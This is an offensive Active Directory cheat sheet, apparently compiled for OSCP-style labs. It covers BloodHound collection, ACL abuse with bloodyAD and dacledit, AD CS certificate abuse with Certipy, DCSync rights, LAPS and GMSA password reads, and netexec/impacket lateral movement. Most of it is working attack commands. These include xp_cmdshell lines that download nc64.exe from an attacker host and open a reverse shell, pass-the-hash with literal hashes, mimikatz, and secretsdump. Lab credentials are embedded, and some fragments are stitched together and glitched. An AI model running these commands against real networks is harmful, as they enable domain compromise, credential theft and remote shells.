# BloodHound ACLs and AD CS

BloodHound collection, ACL abuse, LAPS-oriented access, and AD CS abuse notes that materially help during real operator workflows.
Irrelevant service noise and unrelated local privesc fragments were removed instead of being preserved in place.

## Current BloodHound CE Note

- Current BloodHound Community Edition uses the BloodHound CLI and container-based installation.
- The legacy Neo4j/Java setup is retained below because it is still useful when you hit older operator boxes, pre-CE workflows, or lab images.

## ADCSTemplate

```
Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
```

## BloodHound

```
sudo apt-get install bloodhound
sudo bloodhound-setup
```

> [http://localhost:7474/browser/](http://localhost:7474/browser/)

```
sudo vi /etc/bhapi/bhapi.json
```
```
{
  "database": {
    "addr": "localhost:5432",
    "username": "_bloodhound",
    "secret": "bloodhound",
    "database": "bloodhound"
  },
  "neo4j": {
    "addr": "localhost:7687",
    "username": "neo4j",
    "secret": "neo4j"
  },
  "default_admin": {
    "principal_name": "admin",
    "password": "admin",
    "first_name": "Bloodhound",
    "last_name": "Kali"
  }
}
```
```
sudo bloodhound
```

> [http://127.0.0.1:8080/](http://127.0.0.1:8080/)

| Email Address | Password |
| --- | --- |
| admin | admin |

## BloodHound-Legacy

```
sudo apt-get install openjdk-11-jdk
pip install bloodhound
sudo apt-get install neo4j
sudo apt-get install bloodhound
```
```
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get install neo4j
systemctl start neo4j
./bloodhound --no-sandbox
```

> [http://localhost:7474/browser/](http://localhost:7474/browser/)

## BloodHound Python

```
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip --dns-timeout 30
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
```

## bloodyAD

> [https://github.com/CravateRouge/bloodyAD/wiki/User-Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)

> [https://github.com/CravateRouge/bloodyAD/wiki/Access-Control](https://github.com/CravateRouge/bloodyAD/wiki/Access-Control)

```
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                       // Get all users of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                   // Get all computers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                  // Get all containers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                                              // Get AD DNS records
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                           // Get group members
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version        // Get AD functional level
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                 // Get minimum password length policy
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                        // Get UserAccountControl flags
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                         // Read LAPS password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                  // Read GMSA account password
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                           // Read GMSA account password using Kerberos
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>        // Set a password for a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                             // Set a Service Principal Name (SPN)
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -k set object '<USERNAME>' altSecurityIdentities -v 'X509:<UPN=<USERNAME>@<DOMAIN>>/CN=<CN>'    // Set a email address within a certificate
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                            // Add user to a group using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'                   // Add a computer object on behalf of a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH                                    // Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH                                          // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'    // Add genericAll permissions to a specific OU
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                        // Remove a DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE                                   // Disable ACCOUNTDISABLE (enable account)
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE                                         // Disable ACCOUNTDISABLE (enable account) using Kerberos
```

## Certipy

> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

> [https://github.com/ly4k/BloodHound/](https://github.com/ly4k/BloodHound/)

```
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST>
certipy-ad find -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```

## Account Creation

```
certipy-ad account create -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -dns <RHOST> -user '<COMPUTERNAME>'
```

## Authentication

```
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>'
```

## LDAP-Shell

```
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>' -ldap-shell
```
```
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

## Certificate Forging

```
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -save-old
```

## Certificate Request

Run the following command twice because of a current issue with `certipy`.

```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>'
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>' -debug
```

## Revert Changes

```
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -configuration <TEMPLATE>.json
```
```
./BloodHound --disable-gpu-sandbox
```

## dacledit.py

> [https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py](https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py)

```
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP{>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <RHOST>
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'OU=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -use-ldaps -dc-ip <RHOST>
```
```
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> [https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada\_guids.py](https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py)

## writeDACL

> [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)

```
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```

## Recon Enum GenericWrite permissions on computer objects

```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } | select Identity, AceType, ObjectDN
```

## Recon Get GPOs

```
Get-NetGPO | select displayname, gpcfilesyspath
```

## SharpHound PowerShell

```
Invoke-BloodHound -collectionmethod all -domain <domain> -OutputDirectory (Get-Location) -SearchForest
```

## bloodhound-python

```
bloodhound-python -u <username> -p '<password>' -ns <NS_IP> -d <domain> -c all
```

## bloodhound-python with proxychains

```
proxychains bloodhound-python --zip -k -no-pass -u '<USERNAME>' -d <DOMAIN>  -c all -dc <DC-HOSTNAME> -ns <DNS_IP> --dns-tcp --dns-timeout 20
```

## bloodhound-python with proxychains & dnschief

```
python3 dnschef.py --fakeip <DC_IP> --fakedomains <domain>
proxychains bloodhound-python --zip -k -no-pass -u '<USERNAME>' -d <DOMAIN>  -c all -dc <DC-HOSTNAME> -ns 127.0.0.1
```

## ntlmrelayx Ldap

```
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://<target> -l /save/loot
```

## read LAPS

```
nxc ldap <dc_ip> -d <domain> -u <username> -p '<password>' --module laps
bash
# use the latest release, NXC is now a binary packaged will all its dependencies
root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/nxc-ubuntu-latest.zip

# execute nxc (smb, winrm, mssql, ...)
nxc rdp targets.txt -u users.txt -p pass.txt --ufail-limit 3 --gfail-limit 10 --continue-on-success
root@payload$ nxc smb -L
root@payload$ nxc smb -M name_module -o VAR=DATA
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
root@payload$ nxc smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
root@payload$ nxc smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
root@payload$ nxc smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
root@payload$ nxc smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
root@payload$ nxc smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
root@payload$ nxc mimikatz --server http --server-port 80
```

## LAPSToolkit command

```
Get-LAPSComputers
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

---

```
https://github.com/0xsyr0/oscp
```

## Bloodhound

```
certutil -urlcache -split -f http://192.168.45.171/SharpHound.ps1
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
```
```
netexec ldap nara.nara-security.com -u Tracy.White -p 'zqwj041FGX' --bloodhound -c all -ns 192.168.181.30
netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.10.184.146
```
```
sudo neo4j start
```
```
bloodhound
```
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
```
MATCH p=shortestPath((n)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC5|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor*1..]->(g:Group))
WHERE g.objectid ENDS WITH "-512" AND n<>g
RETURN p
```
💡 When all else fails - take a look at this cheat sheet SPIDER MODULE / ALL IN ONE!

[https://github.com/seriotonctf/cme-nxc-cheat-sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

```
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip 192.168.219.122
```
```
netexec smb 172.16.229.254 -u Administrator -H 'b2c03054c306ac8fc5f9d188710b0168' --local-auth
```
```
netexec smb 172.16.229.0/24 -u joe -p 'Flowers1' --continue-on-success
```
```
netexec rdp 172.16.191.0/24 -u yoshi -p 'Mushroom!' --continue-on-success
```
```
netexec winrm 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
netexec wmi 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
netexec sql 10.10.137.148 -u sql_svc -p Dolphin1

impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```
```
netexec ssh 10.10.137.148 -u sql_svc -p Dolphin1
```
```
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
```
```
impacket-psexec administrator:']12FIYiy&Frtsz'@192.168.157.122
```
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:1f006e5b3ba84ddc6690f4bb2aa559c8 Administrator@192.168.157.122
```
```
lput mimikatz.exe
lget mimikatz.log
```
```
impacket-wmiexec jim:'Castello1!'@192.168.209.189
```
```
evil-winrm -i 172.16.238.83 -u 'wario' -p 'Mushroom!'
```
```
evil-winrm -i 172.16.134.7 -u 'relia.com\Administrator' -p 'vau!XCKjNQBv2$'
```
```
upload <file>
download <file>
```
```
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@192.168.219.122
```
```
impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
```

[https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

## LAPSToolkit command

```
Get-LAPSComputers
Find-AdmPwdExtendedRights
Get-LAPSComputers
```
